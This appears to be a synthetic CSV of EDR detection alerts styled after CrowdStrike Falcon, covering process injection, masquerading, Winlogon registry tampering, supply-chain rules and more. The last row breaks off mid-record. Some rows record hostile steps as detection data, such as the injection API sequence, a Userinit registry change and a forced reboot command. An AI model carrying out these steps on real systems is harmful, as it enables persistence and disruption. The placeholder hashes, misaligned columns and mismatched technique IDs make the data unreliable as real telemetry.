EDR-54321,Implanted Container Image,,implant internal image,Implanted internal container image detected on host SERVER-789,,2022-10-31T09:23:45Z,,,,High,"[{'host_name': 'SERVER-789', 'ip_address': '192.168.1.201'}]","{'image_name': 'implanted-container-image-1', 'source_ip': '192.168.1.202', 'destination_ip': '192.168.1.201', 'process_name': 'explorer.exe', 'user': 'admin', 'container_id': '1234567890abcdef'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30406gfd,detect,2023-03-10T17:00:00Z,file_deletion,An attempt to remove indicators of compromise to avoid detection.,high,,,,{'hostname': 'desktop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized file deletion'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,{'file_path': 'C:\\ProgramData\\malware.exe'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-123456,detect,,process-monitoring,Detected suspicious inter-process communication between two different processes.,high,2022-04-05T13:45:00Z,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Suspicious Inter-Process Communication,"[{'entity_type': 'process', 'process_name': 'Process A', 'process_path': 'C:\\Program Files\\ProcessA\\ProcessA.exe', 'process_hash': 'ABCD1234', 'process_command_line': 'ProcessA.exe /arg1', 'process_pid': 1234}, {'entity_type': 'process', 'process_name': 'Process B', 'process_path': 'C:\\Windows\\System32\\cmd.exe', 'process_hash': 'EFGH5678', 'process_command_line': 'cmd.exe /c netstat', 'process_pid': 5678}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
098765,threat detection,,Command and Scripting Interpreter,"The system command interpreter (cmd.exe) was launched by a non-standard parent process. This could indicate the use of a custom command interpreter, which could be an indicator of malicious activity.",high,2022-03-03T13:42:17Z,,,{'name': 'DESKTOP-ABC123'},,,,,,,,,,,,,Command and Scripting Interpreter,,,,,"{'name': 'MyCustomProcess.exe', 'path': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'command_line': 'MyCustomProcess.exe /run'}",,,,1.0,,Command Interpreter Launched by Unusual Parent Process,,,,,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,[{'phase_name': 'Command and Scripting Interpreter'}],"{'name': 'cmd.exe', 'path': 'C:\\Windows\\System32\\cmd.exe', 'command_line': ""cmd.exe /c echo 'Hello World'""}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-24680,Leveraged Native OS Function Calls,,leveraged OS functions,Leveraged native OS function calls detected on host SERVER-789,,2022-10-15T08:12:34Z,,,,Medium,"[{'host_name': 'SERVER-789', 'ip_address': '192.168.1.150'}]","{'username': 'jdoe', 'domain': 'MYDOMAIN', 'process_name': 'powershell.exe', 'process_command_line': 'powershell.exe -c ""Get-Process | Select-Object Name,ProcessId""', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150', 'function_calls': ['OpenProcess', 'CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory', 'CreateProcessA', 'CreateProcessW', 'CreateToolhelp32Snapshot', 'GetModuleHandleA', 'GetProcAddress', 'LoadLibraryA', 'LoadLibraryW', 'ShellExecuteA', 'ShellExecuteW']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02020r444,Masquerade,2023-03-10T19:00:00Z,Masquerading,An attempt to disguise malware as a legitimate application to avoid detection.,high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Process attempted to execute an unauthorized file'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'explorer.exe', 'command_line': 'explorer.exe /c C:\\Windows\\system32\\notepad.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040f0v,modification,2023-03-10T18:00:00Z,registry_modification,An attempt to modify the authentication process to bypass security controls.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of registry key'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin01'},,,,,,,,,,,,,,,,,,,,,,,,,,,"{'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'registry_value_name': 'Userinit', 'new_value': '', 'old_value': 'C:\\Windows\\system32\\userinit.exe,'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0320r0f,detect,2023-03-10T19:00:00Z,cloud_infrastructure_modification,An attempt to modify cloud compute infrastructure to evade security controls.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of cloud compute instance attribute'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'cloud_provider': 'AWS', 'api_operation': 'ModifyInstanceAttribute', 'resource_type': 'EC2 Instance', 'resource_id': 'i-0123456789abcdef', 'modification_details': {'InstanceType': {'old_value': 't2.micro', 'new_value': 't3.micro'}}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dmkslkdk2,threat detection,2022-03-04T10:31:45Z,System Call,Suspicious Use of Native API Detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,"CrowdStrike Falcon detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33345,nbb_detection,2022-08-10T12:34:56Z,Network boundary bridging,Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,HIGH,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-5678-1234-567812345678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABCDEF1234567890,"{'computer_name': 'Example-PC', 'process_name': 'explorer.exe', 'process_id': '1234', 'command_line': 'C:\\Windows\\Explorer.exe', 'local_address': '192.168.1.2', 'remote_address': '10.0.0.2', 'remote_port': '80', 'protocol': 'TCP', 'nbb_rule': {'action': 'block', 'direction': 'outbound', 'local_networks': ['192.168.1.0/24'], 'remote_networks': ['10.0.0.0/24'], 'protocols': ['tcp'], 'ports': [80], 'applications': ['explorer.exe']}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2022-03-09T10:42:11.000Z,Denial of Service,Crowdstrike Falcon has detected a network denial of service (DoS) attack on the endpoint.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'COMPANY-PC01', 'ip_address': '192.168.1.101', 'os': 'Windows 10 Pro', 'domain': 'company.local'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Crowdstrike Falcon,"{'technique_id': 'T1498', 'technique_name': 'Network Denial of Service', 'subtechnique_id': '', 'subtechnique_name': ''}","{'source_ip': '10.0.0.2', 'destination_ip': '192.168.1.101', 'attack_type': 'UDP Flood', 'attack_duration': '120 seconds', 'affected_services': 'HTTP, DNS, FTP'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3344567,alert,2023-03-09T12:00:00.000000Z,non standard port,,,,,,,high,,,,,,Non-Standard Port,,,TCP,,curl.exe,,,,,,,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Program Files\curl\curl.exe https://example.com:12345,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Non-Standard Port,12345,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,2023-03-04T13:45:30Z,Phishing,An email phishing attempt has been detected.,,,,,"{'hostname': 'endpoint-01', 'ip_address': '192.168.1.10', 'os': 'Windows 10', 'process_name': 'outlook.exe', 'process_commandline': '""C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE""', 'process_id': '1234'}",High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'username': 'johndoe', 'display_name': 'John Doe', 'email_address': 'johndoe@example.com', 'user_agent': 'Microsoft Outlook', 'ip_address': '192.168.1.20'}",,,,,,,,,,,threat,,,,,,,,,,,,,,,,,,,,,,,,,,,,spoofed@example.com,johndoe@example.com,Important: Action Required,"['http://malicious.com', 'http://phishing.com']",['invoice.pdf'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,,Plist File Modification,A suspicious modification has been detected in a plist file.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,2023-03-10T11:15:00Z,hostname123,/Library/LaunchDaemons/com.apple.plist,CrowdStrike Falcon,Investigate the nature and purpose of the plist modification and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,2023-03-10T12:00:00Z,suspicious pre-OS boot imagex,A suspicious pre-OS boot image has been detected.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,,,,,,,,,,,,,,,,threat,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Critical,,hostname123,,CrowdStrike Falcon,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,Pre-OS Boot,Persistence,Pre-OS Boot,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,Private Key Intercept,,privaqte key interception,Private key intercepted on host WEB-123,,2022-10-31T23:45:01Z,,,,Critical,"[{'host_name': 'WEB-123', 'ip_address': '192.168.1.150'}]","{'username': 'webadmin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150', 'private_key_path': 'C:\\Users\\webadmin\\.ssh\\id_rsa'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,2023-03-10T13:30:00Z,Process Injection,A suspicious process injection has been detected.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,,CrowdStrike Falcon,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,explorer.exe,notepad.exe,Thread Execution Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
939495555,threat_detection,2023-03-09T15:30:00Z,protocol_tunneling,,high,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']",,,,,,,,,,,,,,Detection of protocol tunneling activity,,,,,,,,,,,,,,,,,,,,,"['192.168.1.10', '10.0.0.2']","['Isolate affected endpoints', 'Investigate network traffic']",Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,detect,2023-03-09T15:45:00Z,proxy,Detection of a connection being made through a proxy,,,,,,high,,,,,,T1090 - Proxy,,,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_name': 'cmd.exe', 'file_path': 'C:\\Windows\\System32\\cmd.exe', 'file_hash': '1a2b3c4d5e6f7g8h9i0j'}","{'destination_ip': '1.2.3.4', 'destination_domain': 'example.com', 'protocol': 'TCP'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Remote Administration Tool,,RA Admin,RAdmin tool used to remotely control workstation WS-456,,2022-11-30T12:34:56Z,,,,High,"[{'host_name': 'SERVER-123', 'ip_address': '192.168.1.200'}]","{'username': 'admin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.201', 'destination_ip': '192.168.1.200', 'remote_tool': 'RAdmin'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Reflective Code Loading,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,explorer.exe,,,,,,,,2023-03-10T15:45:00Z,A suspicious reflective code loading activity has been detected.,notepad.exe,Reflective DLL Injection,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,threat,,Process/Service Stop,Suspicious Service Stop detected,high,2022-03-06T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_name': 'ServiceName', 'entity_value': 'SuspiciousServiceName'}, {'entity_name': 'ProcessName', 'entity_value': 'C:\\Windows\\System32\\services.exe'}, {'entity_name': 'ProcessCommandLine', 'entity_value': 'services.exe stop SuspiciousServiceName'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,"['Investigate the reason for the suspicious stop of the service.', ""Review the service's configuration to ensure it is properly configured."", 'Monitor for any further suspicious activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,Suspicious Shared Module Loaded,Adversaries may execute malicious payloads via loading shared modules.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678,mycomputer,,,mydomain.local,,,,,,,,,,THREAT,,,,,,,,,,,,,,,,,,,,123456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['192.168.1.100', 'fe80::1234:5678:90ab:cdef']",['00:11:22:33:44:55'],Windows 10,6.30.0.0,Workstations,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040t0y,detect,2023-03-03T15:30:00Z,Software Deployment Tools,Suspicious use of software deployment tool detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'endpoint', 'process_name': 'msiexec.exe', 'process_path': 'C:\\Windows\\System32\\msiexec.exe', 'process_command_line': '""C:\\Program Files\\MyApp\\installer.msi"" /quiet', 'pid': 1234, 'user': {'username': 'john.doe', 'domain': 'contoso'}, 'hostname': 'WIN-ABC123'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A suspicious use of a software deployment tool (msiexec.exe) was detected on endpoint WIN-ABC123. The installer.msi file was executed silently (/quiet) by user john.doe from domain contoso with PID 1234. The file and the registry key were added as indicators of compromise.,,,,,,,,,,,,,,,,,,,,,"[{'type': 'file_hash', 'value': '9c9dbd97f591812e81a7d1afcbcfb769'}, {'type': 'registry_key', 'value': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MyApp'}]",,,,,,,,,,,,,,,,,"{'type': 'file', 'path': 'C:\\Program Files\\MyApp\\installer.msi'}",high,malware,unknown,"[{'type': 'file', 'value': 'C:\\Program Files\\MyApp\\installer.msi'}, {'type': 'registry_key', 'value': 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\MyApp'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
939r0t-0,,,supply chain,"A supply chain compromise has been detected on the endpoint, indicating a potential compromise of trusted software or hardware components.",high,,,,,,,,,,,,,,,,,,,,,,,,,,,,Supply Chain Compromise Detected,,,,"Investigate the affected software or hardware component for signs of compromise and take appropriate remediation actions, such as blocking the component or applying a security update.",,,,,,,,,,,"{'data_sources': ['Windows Event Logs', 'Process Monitoring', 'Network Traffic'], 'detection_rules': [{'field': 'process.command_line', 'description': 'Process command-line includes suspicious or unexpected parameters', 'value': 'msiexec.exe'}, {'field': 'file.path', 'description': 'File created or modified with malicious content', 'value': 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malicious.bat'}, {'field': 'network', 'description': 'Outbound connection to suspicious or known malicious IP and/or port', 'value': 'destination_ip:""123.45.67.89"" AND destination_port:""443""'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['MITRE ATT&CK T1195', 'Supply Chain Compromise']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
039r9t90y,DetectionSummaryEvent,2023-03-04T15:30:00Z,system services modified,,high,,,,"{'hostname': 'endpoint-01', 'os_version': 'Windows 10', 'ip_address': '192.168.1.100'}",,,,,An attempt to modify or interact with system services was detected.,123456,,,,,,services.exe,,,,,,,,,,,,,,,System Services T1569,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,"{'username': 'admin', 'sid': 'S-1-5-21-123456'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,System Services,An attempt to modify or interact with system services was detected.,ProcessModifiedServices,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,detect,2023-03-06T14:02:30Z,system shutdown,A system shutdown or reboot has been initiated.,,,,,,high,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,malware,,,,,,,,shutdown /r /t 0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,System Shutdown/Reboot,T1529,active,2023-03-06T14:02:30Z,"{'ip': '192.168.1.100', 'hostname': 'DESKTOP-1234', 'username': 'user1'}","[{'pid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 5678, 'ppid': 1234, 'name': 'cmd.exe', 'username': 'user1', 'start_time': '2023-03-06T14:00:00Z'}, {'pid': 9012, 'ppid': 5678, 'name': 'shutdown.exe', 'username': 'user1', 'start_time': '2023-03-06T14:02:30Z'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
040t0y0,treaffic signaling,2023-03-09T12:30:00Z,Unusual network traffic detected,CrowdStrike Falcon has detected unusual network traffic on the endpoint that could be indicative of traffic signaling activity.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'EXAMPLE-HOSTNAME', 'ip_address': '192.168.0.100', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,Malware,,trojan,Trojanized SSH client detected on host LAPTOP-XYZ,Critical,2022-10-31T01:23:45Z,,,,,"[{'host_name': 'LAPTOP-XYZ', 'ip_address': '192.168.1.50'}]","{'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50', 'malware_name': 'Trojanized SSH Client', 'malware_type': 'Trojan', 'malware_action': 'Execution'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
abcd-1234-efgh-5678,alert,2022-04-01T12:34:56Z,Trusted Relationship,A process has established a new trusted relationship with a remote system.,high,,,,,,,,,,,,,,,,svchost.exe,,,,,C:\Windows\system32\svchost.exe -k netsvcs,,,Behavior monitoring,,2.0,,,"{'hostname': 'PC-1234', 'ip_address': '192.168.1.100', 'mac_address': '00:11:22:33:44:55', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,services.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Suspicious Trusted Relationship,"[{'phase': 'Execution', 'kill_chain_id': 'mitre-attack', 'technique_id': 'T1199', 'technique_name': 'Trusted Relationship'}]",C:\Windows\System32\ntdll.dll,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c whoami,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,User Execution Detected,User attempted to execute a potentially malicious file.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,2022-04-01T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345,Detection,"{'Hostname': 'PC123', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10'}","{'FilePath': 'C:\\Users\\User1\\Downloads\\malware.exe', 'Hash': 'abc123def456', 'Signer': 'Unknown', 'CommandLine': 'C:\\Users\\User1\\Downloads\\malware.exe', 'ParentProcess': {'Name': 'explorer.exe', 'PID': '1234', 'Path': 'C:\\Windows\\explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kldkfkg02,detect,2023-03-09T09:00:00Z,Suspicious Web Service Connection,CrowdStrike detected suspicious network activity related to a web service on the endpoint.,medium,,,,,,,,,,,,,,,,C:\Windows\System32\svchost.exe,,,,,,,,,,1.0,,,,,,,,,,,,,,10.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k DcomLaunch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789def,W3SVC,C:\Windows\System32\inetsrv\w3wp.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040rt0f,threat,2022-04-01T12:34:56.789Z,Windows Management Instrumentation,Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,process,wmiprvse.exe,"{'process_name': 'wmiprvse.exe', 'process_path': 'C:\\Windows\\System32\\wbem\\wmiprvse.exe', 'command_line': 'wmiprvse.exe /secured /caller:""NT AUTHORITY\\SYSTEM"" /embedding', 'process_sha256': 'ABC123...', 'parent_process_name': 'svchost.exe', 'parent_process_path': 'C:\\Windows\\System32\\svchost.exe', 'parent_process_command_line': 'svchost.exe -k DcomLaunch', 'parent_process_sha256': 'DEF456...', 'username': 